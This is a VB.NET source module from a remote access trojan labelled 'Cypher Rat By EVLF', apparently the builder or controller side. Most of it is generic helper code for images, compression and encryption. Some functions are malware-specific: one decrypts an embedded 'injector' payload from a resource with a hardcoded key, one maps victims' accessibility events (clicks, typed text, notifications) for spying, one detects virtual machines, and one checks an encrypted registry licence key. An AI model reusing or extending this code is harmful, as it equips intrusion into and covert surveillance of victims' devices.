Imports System.Drawing.Drawing2D
Imports System.Reflection
Imports System.Threading
'------------------------------------
'---------Cypher Rat By EVLF
'-----------------------------------
'---------t.me/evlfdev
'------------------------------------
Module Codes
    Public Function AddWatermark(ByVal img As Bitmap, ByVal watermarkText As String) As Bitmap
        Dim bitmap As Bitmap = img
        Dim font As Font = New Font("Ropoto", 25, FontStyle.Bold, GraphicsUnit.Pixel)
        Dim color As Color = Color.FromArgb(255, 0, 0)
        Dim atPoint As Point = New Point(img.Width / 2, img.Height / 2)
        Dim brush As SolidBrush = New SolidBrush(color)
        Dim graphics As Graphics = Nothing

        Try
            graphics = Graphics.FromImage(bitmap)
        Catch
            Dim temp As Bitmap = bitmap
            bitmap = New Bitmap(bitmap.Width, bitmap.Height)
            graphics = Graphics.FromImage(bitmap)
            graphics.DrawImage(temp, New Rectangle(0, 0, bitmap.Width, bitmap.Height), 0, 0, bitmap.Width, bitmap.Height, GraphicsUnit.Pixel)
            temp.Dispose()
        End Try

        graphics.DrawString(watermarkText, font, brush, atPoint)
        graphics.Dispose()

        Return bitmap
    End Function

    Function Base64ToImage(ByVal base64string As String) As System.Drawing.Image
        Dim img As System.Drawing.Image
        Dim MS As System.IO.MemoryStream = New System.IO.MemoryStream
        Dim b64 As String = base64string.Replace(" ", "+")
        Dim b() As Byte
        b = Convert.FromBase64String(b64)
        MS = New System.IO.MemoryStream(b)
        img = System.Drawing.Image.FromStream(MS)
        Return img
    End Function
    Public Function Encoding() As System.Text.Encoding
        Return System.Text.Encoding.UTF8
    End Function
    Public Function VideoTime(millisec As String) As String
        Dim Sec As Long = CLng(millisec) / 1000
        Dim TS As TimeSpan = TimeSpan.FromSeconds(Sec)
        Return Format(TS.Hours, "00") & ":" & Format(TS.Minutes, "00") & ":" & Format(TS.Seconds, "00").ToString
    End Function
    Friend Function GETJECTOR(v As String) As Byte()
        If v IsNot "==ARVRAYKGHJRSTHWTSRYJHSTTSAERRGR" Then
            If v.Length > 2 Then
                Return Convert.FromBase64String(Decrypt(My.Resources.LOGS, "ProgramShellWindow"))
            End If
        End If
        Return Nothing
    End Function
    Public Function GetSpeed(speed As String) As String
        Dim sp As Integer = CInt(speed) * 3600 / 1000
        Return String.Format("{0} km/h", sp)
    End Function
    Public Function Duration(Time As Integer) As String
        Dim Hrs, Min, Sec As Integer
        Sec = Time Mod 60
        Min = ((Time - Sec) / 60) Mod 60
        Hrs = ((Time - (Sec + (Min * 60))) / 3600) Mod 60
        Return Format(Hrs, "00") & ":" & Format(Min, "00") & ":" & Format(Sec, "00").ToString
    End Function
    Public Function ToTime(ByVal Value As Long) As String
        Dim mHours As Long, mMinutes As Long, mSeconds As Long
        mSeconds = Value
        mHours = mSeconds \ 3600
        mMinutes = (mSeconds - (mHours * 3600)) \ 60
        mSeconds = mSeconds - ((mHours * 3600) + (mMinutes * 60))
        Return String.Format("{0}:{1}:{2}", CStr(mHours), CStr(mMinutes), CStr(mSeconds))
    End Function
    Public Function CGzip(ByVal b() As Byte) As Byte()
        Try
            Using memory As IO.MemoryStream = New IO.MemoryStream()
                If memory.CanSeek Then
                    memory.Seek(0, IO.SeekOrigin.Begin)
                End If
                Using gzip As IO.Compression.GZipStream = New IO.Compression.GZipStream(memory, IO.Compression.CompressionMode.Compress, True)
                    gzip.Write(b, 0, b.Length)
                End Using
                Return memory.ToArray()
            End Using
        Catch ex As Exception
        End Try
    End Function
    Public Function DEgzip(ByRef b() As Byte) As Byte()
        Try
            Using output As IO.MemoryStream = New IO.MemoryStream()
                Using memory As IO.MemoryStream = New IO.MemoryStream(b)
                    If memory.CanSeek Then
                        memory.Seek(0, IO.SeekOrigin.Begin)
                    End If
                    Using gzip As IO.Compression.GZipStream = New IO.Compression.GZipStream(memory, IO.Compression.CompressionMode.Decompress)
                        gzip.CopyTo(output)
                    End Using
                    Return output.ToArray()
                End Using
            End Using
        Catch ex As Exception
        End Try
    End Function
    Public Function CheckRegPolice(txt As String) As String
        Dim regKey As Microsoft.Win32.RegistryKey
        Dim Value As Object
        Try
            regKey = My.Computer.Registry.CurrentUser.OpenSubKey(Codes.Decrypt("mPb5+15u0LaYLEdH2qCrGg==", sockets.Data.THEKEY), True)
            Value = regKey.GetValue("k")
            If Value = Nothing Then
                Return Nothing
            Else
                If Value = txt Then
                    Return Value
                Else
                    Return Nothing
                End If
            End If
            regKey.Close()
        Catch ex As Exception
        End Try
        Return Nothing
    End Function
    Public Function BSEN(Str As String)
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(Str)
        Return Convert.ToBase64String(byt)
    End Function
    Public Function ResizeImage(ByVal InputImage As Image, ByVal size As Size, Optional ByVal preserveAspectRatio As Boolean = False) As Image
        Try
            Dim newWidth As Integer
            Dim newHeight As Integer
            If preserveAspectRatio Then
                Dim originalWidth As Integer = InputImage.Width
                Dim originalHeight As Integer = InputImage.Height
                Dim percentWidth As Single = CSng(size.Width) / CSng(originalWidth)
                Dim percentHeight As Single = CSng(size.Height) / CSng(originalHeight)
                Dim percent As Single = IIf(percentHeight < percentWidth, percentHeight, percentWidth)
                newWidth = CInt(originalWidth * percent)
                newHeight = CInt(originalHeight * percent)
            Else
                newWidth = size.Width
                newHeight = size.Height
            End If
            Dim newImage As Image = New Bitmap(newWidth, newHeight)
            Using graphicsHandle As Graphics = Graphics.FromImage(newImage)
                graphicsHandle.InterpolationMode = InterpolationMode.HighQualityBicubic
                graphicsHandle.DrawImage(InputImage, 0, 0, newWidth, newHeight)
            End Using
            Return newImage
        Catch ex As Exception
            Return InputImage
        End Try
    End Function
    Public Function SplitByte(ByVal b As Byte(), ByVal s As Array) As Object()
        Dim Obj(1) As Object
        Dim ms As New IO.MemoryStream
        Dim StringSize As Long = DirectCast(s.GetValue(0), Long)
        ms.Write(b, 0, StringSize)
        Obj(0) = Codes.DEgzip(ms.ToArray)
        ms.Dispose()
        ms = New IO.MemoryStream
        Dim ByteSize As Long = DirectCast(s.GetValue(1), Long)
        ms.Write(b, StringSize, ByteSize)
        Obj(1) = Codes.DEgzip(ms.ToArray)
        ms.Dispose()
        Return Obj
    End Function
    Public Function BSDE(Str As String) As String
        Return Encoding.UTF8.GetString(Convert.FromBase64String(Str))
    End Function
    Public Function ENC(text As String, password As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Dim hash(31) As Byte
        Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(password))
        Array.Copy(temp, 0, hash, 0, 16)
        Array.Copy(temp, 0, hash, 15, 16)
        AES.Key = hash
        AES.Mode = Security.Cryptography.CipherMode.ECB
        Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
        Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(text)
        encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
        Return encrypted
    End Function
    Public Function DEC(text As String, password As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Dim hash(31) As Byte
        Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(password))
        Array.Copy(temp, 0, hash, 0, 16)
        Array.Copy(temp, 0, hash, 15, 16)
        AES.Key = hash
        AES.Mode = Security.Cryptography.CipherMode.ECB
        Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
        Dim Buffer As Byte() = Convert.FromBase64String(text)
        decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
        Return decrypted
    End Function
    Public Function FixSize(ByVal lc0 As Form, ByVal lc1 As Form) As Point
        Dim x, y As Integer
        x = lc0.Location.X + CInt(lc0.Width / 2) - CInt(lc1.Width / 2)
        y = lc0.Location.Y + CInt(lc0.Height / 2) - CInt(lc1.Height / 2)
        If x < 0 Then
            x = 0
        End If
        If y < 0 Then
            y = 0
        End If
        If x > Screen.PrimaryScreen.WorkingArea.Size.Width - lc1.Size.Width Then
            x = Screen.PrimaryScreen.WorkingArea.Size.Width - lc1.Size.Width
        End If
        If y > Screen.PrimaryScreen.WorkingArea.Size.Height - lc1.Size.Height Then
            y = Screen.PrimaryScreen.WorkingArea.Size.Height - lc1.Size.Height
        End If
        Return New System.Drawing.Point(x, y)
    End Function
    Public Function BytesConverter(ByVal bytes As Long) As Array
        Dim KB As Long = 1024
        Dim MB As Long = KB * KB
        Dim GB As Long = KB * KB * KB
        Dim TB As Long = KB * KB * KB * KB
        Dim returnVal As String = "0 Bytes"
        Select Case bytes
            Case Is < KB
                returnVal = bytes & " Bytes"
            Case Is > TB
                returnVal = (bytes / KB / KB / KB / KB).ToString("0.00") & " TB"
            Case Is > GB
                returnVal = (bytes / KB / KB / KB).ToString("0.00") & " GB"
            Case Is > MB
                returnVal = (bytes / KB / KB).ToString("0.00") & " MB"
            Case Is >= KB
                returnVal = (bytes / KB).ToString("0.00") & " KB"
        End Select
        Return {returnVal.ToString}
    End Function
    Public Function UploadDownload(ByVal ParametersLong0 As Long, ByVal ParametersLong1 As Long) As Array
        Try
            Static LastUpload As Long = ParametersLong0
            Static LastDownload As Long = ParametersLong1
            Dim Up = ParametersLong0 - LastUpload
            Dim Down = ParametersLong1 - LastDownload
            LastUpload = ParametersLong0
            LastDownload = ParametersLong1
            Return {Codes.BytesConverter(If(Down < 0, 0, Down)).GetValue(0), Codes.BytesConverter(If(Up < 0, 0, Up)).GetValue(0)}
        Catch ex As Exception
            Return {"n/a", "n/a"}
        End Try
    End Function
    Public Function DE(ByVal by As Byte(), ByVal k As String) As Byte()
        Dim ms0 As IO.MemoryStream = New IO.MemoryStream()
        Using ms1 As IO.MemoryStream = New IO.MemoryStream(by)
            Dim rm As Security.Cryptography.RijndaelManaged = alg(k)
            Using cs As Security.Cryptography.CryptoStream = New Security.Cryptography.CryptoStream(ms1, rm.CreateDecryptor(), Security.Cryptography.CryptoStreamMode.Read)
                Dim buf(0 To CType(ms1.Length - 1, Integer)) As Byte
                Dim read As Integer = cs.Read(buf, 0, CType(ms1.Length, Integer))
                ms0.Write(buf, 0, read)
            End Using
        End Using
        Return ms0.ToArray
    End Function
    Private Function alg(ByVal secretKey As String) As Security.Cryptography.RijndaelManaged
        Const s As String = "xy7h8842n61q50xf2x"
        Const kz As Integer = 256
        Dim kb As Security.Cryptography.Rfc2898DeriveBytes = New Security.Cryptography.Rfc2898DeriveBytes(secretKey, Text.Encoding.Unicode.GetBytes(s))
        Dim al As Security.Cryptography.RijndaelManaged = New Security.Cryptography.RijndaelManaged()
        al.KeySize = kz
        al.IV = kb.GetBytes(CType(al.BlockSize / 8, Integer))
        al.Key = kb.GetBytes(CType(al.KeySize / 8, Integer))
        al.Padding = Security.Cryptography.PaddingMode.PKCS7
        Return al
    End Function
    Public Function FormatPacket(ByVal Strings As String, ByVal bByte As Byte()) As Byte()
        Dim MS As IO.MemoryStream
        MS = New IO.MemoryStream
        Dim B As Byte() = Codes.CGzip(bByte)
        Dim S As Byte() = Codes.CGzip(Codes.Encoding().GetBytes(Strings))
        Dim LS As Byte() = Codes.Encoding().GetBytes(S.Length)
        Dim CH As Byte() = Codes.Encoding().GetBytes(ChrW(0))
        Dim LB As Byte() = Codes.Encoding().GetBytes(B.Length)
        MS.Write(LS, 0, LS.Length)
        MS.Write(CH, 0, CH.Length)
        MS.Write(LB, 0, LB.Length)
        MS.Write(CH, 0, CH.Length)
        MS.Write(S, 0, S.Length)
        MS.Write(B, 0, B.Length)
        Dim F As Byte() = MS.ToArray
        MS.Dispose()
        Return F
    End Function
    Public Function GetStatistics(ByVal data As String) As String()
        Dim ms As String = "time="
        Dim loss As String = "packet loss"
        Try
            Dim dt As String = data.ToLower
            If dt.Contains(ms) Then
                Dim spl1 As Object = dt.ToLower.Split({ms}, StringSplitOptions.None).GetValue(1)
                Dim spl2 As Object = spl1.Split({"ms"}, StringSplitOptions.None).GetValue(0)
                ms = CStr(spl2).Trim
            Else
                ms = "0"
            End If
            If dt.Contains(loss) Then
                Dim spl1 As Object = dt.Split({loss}, StringSplitOptions.None).GetValue(0)
                Dim spl2 As Object() = spl1.Split({","}, StringSplitOptions.None)
                loss = CStr(spl2.GetValue(spl2.Length - 1))
            End If
        Catch ex As Exception
            Return {"", ""}
        End Try
        If loss = "packet loss" Then
            Return {"", ""}
        Else
            Return {ms.Trim, loss.Trim}
        End If
    End Function
    Public Function GetIPAddress() As String
        Try
            Dim hostName = System.Net.Dns.GetHostName()
            For Each hostAdr In System.Net.Dns.GetHostEntry(hostName).AddressList()
                If hostAdr.ToString().StartsWith("192.168.1.") Then
                    Return hostAdr.ToString()
                End If
            Next
        Catch ex As Exception
        End Try
        Return "127.0.0.1"
    End Function
    Public Function RateConverter(ByVal Value As Integer, ByVal Totalsize As Integer) As Integer
        Try
            If Totalsize = 0 Then
                Return 0
            End If
            Return CInt(Math.Round(CDbl(((CDbl(Value) / CDbl(Totalsize)) * 100))))
        Catch ex As Exception
            Return 0
        End Try
    End Function
    Public Function AccessibilityEvent(ByVal v As Integer) As String
        Select Case v
            Case 0
                Return "CLICKED"
            Case 1
                Return "FOCUSED"
            Case 2
                Return "LONG CLICKED"
            Case 3
                Return "TEXT"
            Case 4
                Return "NOTIFICATION"
            Case 5
                Return "WINDOW CHANGED"
            Case Else
                Return "n/a"
        End Select
    End Function
    Private Declare Function SetThreadExecutionState Lib _
    "kernel32" (ByVal esflags As EXECUTION_STATE) As EXECUTION_STATE
    Private Enum EXECUTION_STATE
        ES_SYSTEM_REQUIRED = &H1
        ES_DISPLAY_REQUIRED = &H2
        ES_CONTINUOUS = &H80000000
    End Enum
    Private Function Power() As EXECUTION_STATE
        Return SetThreadExecutionState(EXECUTION_STATE.ES_SYSTEM_REQUIRED Or
           EXECUTION_STATE.ES_CONTINUOUS Or EXECUTION_STATE.ES_DISPLAY_REQUIRED)
    End Function
    Public Sub AcquirePower()
        Power()
    End Sub
    Public Function Decrypt(text As String, password As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Dim hash(31) As Byte
        Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(password))
        Array.Copy(temp, 0, hash, 0, 16)
        Array.Copy(temp, 0, hash, 15, 16)
        AES.Key = hash
        AES.Mode = Security.Cryptography.CipherMode.ECB
        Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
        Dim Buffer As Byte() = Convert.FromBase64String(text)
        decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
        Return decrypted
    End Function
    Public Function Encrypt(ByVal text As String, ByVal password As String) As String
        Dim AES As System.Security.Cryptography.RijndaelManaged = New System.Security.Cryptography.RijndaelManaged()
        Dim Hash_AES As System.Security.Cryptography.MD5CryptoServiceProvider = New System.Security.Cryptography.MD5CryptoServiceProvider()
        Dim encrypted As String = ""
        Dim hash As Byte() = New Byte(31) {}
        Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(password))
        Array.Copy(temp, 0, hash, 0, 16)
        Array.Copy(temp, 0, hash, 15, 16)
        AES.Key = hash
        AES.Mode = System.Security.Cryptography.CipherMode.ECB
        Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor()
        Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(text)
        encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
        Return encrypted
    End Function
    Public Function isVmw() As Boolean
        Using searcher = New System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem")
            Using items = searcher.[Get]()
                For Each item In items
                    Dim manufacturer As String = item("Manufacturer").ToString().ToLower()
                    If (manufacturer = "microsoft corporation" AndAlso item("Model").ToString().ToUpperInvariant().Contains("VIRTUAL")) OrElse manufacturer.Contains("vmware") OrElse item("Model").ToString() = "VirtualBox" Then
                        Return True
                    End If
                Next
            End Using
        End Using
        Return False
    End Function
End Module
Module infoServer
    Public PORTS As String = String.Empty
    Public KeySize As Integer = 8
    Public Microseconds As Int32 = -1
    Public WorkerRemove As New List(Of Windows.Forms.DataGridViewRow)
 End Module
Public Class MyWebClient
    Inherits Net.WebClient
     Protected Overrides Function GetWebRequest(ByVal address As System.Uri) As System.Net.WebRequest
        Dim R = MyBase.GetWebRequest(address)
        If TypeOf R Is Net.HttpWebRequest Then
            With DirectCast(R, Net.HttpWebRequest)
                .ClientCertificates.Add(New Security.Cryptography.X509Certificates.X509Certificate())
            End With
        End If
        Return R
    End Function
End Class